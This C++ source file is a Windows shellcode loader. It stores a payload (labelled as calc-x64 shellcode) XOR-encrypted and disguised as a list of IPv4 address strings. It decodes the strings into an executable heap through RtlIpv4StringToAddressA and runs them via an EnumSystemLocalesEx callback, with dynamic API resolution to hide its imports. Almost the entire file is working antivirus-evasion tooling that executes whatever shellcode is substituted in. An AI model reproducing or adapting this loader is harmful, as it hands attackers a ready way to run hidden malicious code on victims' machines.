/*
IPv4Fuscation-Decryption
Execute shellcode from XOR encrypted + IPv4 address encoded format
*/

#include <iostream>
#include <string>
#include <vector>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <Ip2string.h>
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Ntdll.lib")

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

// IMPORTS
typedef HANDLE(__stdcall* pHeapCreate) (DWORD, SIZE_T, SIZE_T);
typedef LPVOID(__stdcall* pHeapAlloc) (HANDLE, DWORD, SIZE_T);
typedef BOOL(__stdcall* pCloseHandle) (HANDLE);
typedef NTSTATUS(__stdcall* pRtlIpv4StringToAddressA) (PCSTR, BOOLEAN, PCSTR*, in_addr*);
typedef BOOL(__stdcall* pEnumSystemLocalesEx) (LOCALE_ENUMPROCEX, DWORD, LPARAM, LPVOID);

// XOR decryption iterations
int iteration = 5;

// Encrypted IPs of calc-x64.bin shellcode
const char* ips_encrypted[] =
{
        "153.37.236.183", "149.133.175.83", "101.109.46.2", "36.61.61.2",
        "51.37.94.129", "0.37.228.1", "5.37.228.1", "125.37.228.1",
        "69.37.228.33", "53.37.96.228", "47.39.34.98", "172.37.94.147",
        "201.81.14.47", "103.65.79.18", "164.164.98.18", "100.172.141.190",
        "55.44.62.27", "238.63.79.216", "39.81.39.82", "181.230.239.219",
        "101.109.111.27", "224.173.27.52", "45.108.191.3", "238.37.119.23",
        "238.45.79.26", "100.189.140.5", "45.146.166.18", "238.89.231.27",
        "100.187.34.98", "172.37.94.147", "201.44.174.154", "104.44.110.146",
        "93.141.26.162", "41.110.35.119", "109.40.86.130", "16.181.55.23",
        "238.45.75.26", "100.189.9.18", "238.97.39.23", "238.45.115.26",
        "100.189.46.216", "97.229.39.82", "181.44.55.18", "61.51.54.9",
        "36.53.46.10", "36.55.39.208", "137.77.46.1", "154.141.55.18",
        "60.55.39.216", "119.132.56.172", "154.146.50.27", "223.108.111.83",
        "101.109.111.83", "101.37.226.222", "100.108.111.83", "36.215.94.216",
        "10.234.144.134", "222.157.218.241", "51.44.213.245", "240.208.242.172",
        "176.37.236.151", "77.81.105.47", "111.237.148.179", "16.104.212.20",
        "118.31.0.57", "101.52.46.218", "191.146.186.48", "4.1.12.125",
        "0.21.10.83"
};

const size_t ips_size = sizeof(ips_encrypted) / sizeof(ips_encrypted[0]); // Size of shellcode

char ips_decrypted[ips_size][16];

// XOR encryption key
std::string key = "Some s3cret!";


// XOR decryption
int xor_decrypt(int num, const std::string key) {
    int result = num;
    int key_len = key.length();
    for (int i = 0; i < iteration; ++i) {
        for (int j = 0; j < 4; ++j) {
            result ^= key[j % key_len] << (8 * j);
        }
    }
    return result;
}

// Convert IP address char array to int 
unsigned int ip_to_int_chararray(const char input_ip[])
{
    uint32_t ip;
    struct in_addr addr;
    if (inet_pton(AF_INET, input_ip, &addr) == 1) {
        ip = ntohl(addr.s_addr);
        //std::cout << input_ip << " => " << ip << std::endl;
    }
    else {
        std::cout << "Failed to convert " << input_ip << " to integer format" << std::endl;
    }
    return ip;
}

// Convert int to IP address char array
char* int_to_ip_chararray(unsigned int ip_int) {
    struct in_addr in;
    in.s_addr = htonl(ip_int);
    char* buffer = new char[INET_ADDRSTRLEN];
    if (InetNtopA(AF_INET, &in, buffer, INET_ADDRSTRLEN) == NULL) {
        std::cerr << "Error converting int to IP address." << std::endl;
        return nullptr;
    }
    return buffer;
}

int main()
{
    // Loop through list of IPs
    for (int i = 0; i < ips_size; i++) {
        // Get int format of IP address
        unsigned int int_enc_ip = ip_to_int_chararray(ips_encrypted[i]); // Loop through shellcode

        // XOR decrypt int
        int int_decrypted = xor_decrypt(int_enc_ip, key);
       
        // Convert decrypted int to IP and save to char array
        strncpy_s(ips_decrypted[i], int_to_ip_chararray(int_decrypted), 16);
#if DEBUG
        std::cout << "Encrypted IP: " << ips_encrypted[i] << ", Encrypted int: " << int_enc_ip << ", Decrypted int = " << int_decrypted
            << ", Decrypted IP = " << ips_decrypted[i] << "\n"; 
#endif
    }
    
    // Get module handles
    HMODULE Kernel32Addr = GetModuleHandleA("Kernel32.dll");
    HMODULE NtdllAddr = GetModuleHandleA("Ntdll.dll");

    // Get function addresses
    pHeapCreate addrHeapCreate = (pHeapCreate)GetProcAddress(Kernel32Addr, "HeapCreate");
    pHeapAlloc addrpHeapAlloc = (pHeapAlloc)GetProcAddress(Kernel32Addr, "HeapAlloc");
    pCloseHandle addrCloseHandle = (pCloseHandle)GetProcAddress(Kernel32Addr, "CloseHandle");
    pRtlIpv4StringToAddressA addrRtlIpv4StringToAddressA = (pRtlIpv4StringToAddressA)GetProcAddress(NtdllAddr, "RtlIpv4StringToAddressA");
    pEnumSystemLocalesEx addrEnumSystemLocalesEx = (pEnumSystemLocalesEx)GetProcAddress(Kernel32Addr, "EnumSystemLocalesEx");

    PCSTR Terminator = NULL;

    // Create heap
    HANDLE hHeap = addrHeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
    if (!hHeap) {
        printf("[-]Failed to create a heap (%u)\n", GetLastError());
        return -1;
    }

    // Allocate space on heap
    void* alloc_mem = addrpHeapAlloc(hHeap, 0, 0x100000);
    if (!alloc_mem) {
        printf("[-]Failed to allocate memory on the heap (%u)\n", GetLastError());
        return -2;
    }

    DWORD_PTR ptr = (DWORD_PTR)alloc_mem;
    int size = sizeof(ips_decrypted) / sizeof(ips_decrypted[0]);
    std::cout << "Size of IP array: " << size << "\n";

    // Loop through decrypted IP addresses
    for (int j = 0; j < size; j++) 
    {   
#if DEBUG
        std::cout << "Number: " << j << " - IP decrypted: " << ips_decrypted[j] << "\n";
#endif
        // Convert IP address and store on heap "ptr" variable
        RPC_STATUS STATUS = addrRtlIpv4StringToAddressA((PCSTR)ips_decrypted[j], FALSE, &Terminator, (in_addr*)ptr);
        
        if (!NT_SUCCESS(STATUS)) 
        {
            printf("[-] RtlIpv6StringToAddressA failed in %s result %x (%u)", ips_decrypted[j], STATUS, GetLastError());
            addrCloseHandle(alloc_mem);
            return FALSE;
        }
        ptr += 4;
    }

    // Callback function
    addrEnumSystemLocalesEx((LOCALE_ENUMPROCEX)alloc_mem, LOCALE_ALL, NULL, NULL);

    // Cleanup
    VirtualFree(alloc_mem, sizeof(ips_decrypted), MEM_DECOMMIT);
    addrCloseHandle(alloc_mem);
    memset(&ips_encrypted[0], 0, sizeof(ips_encrypted));

    return 0;
}

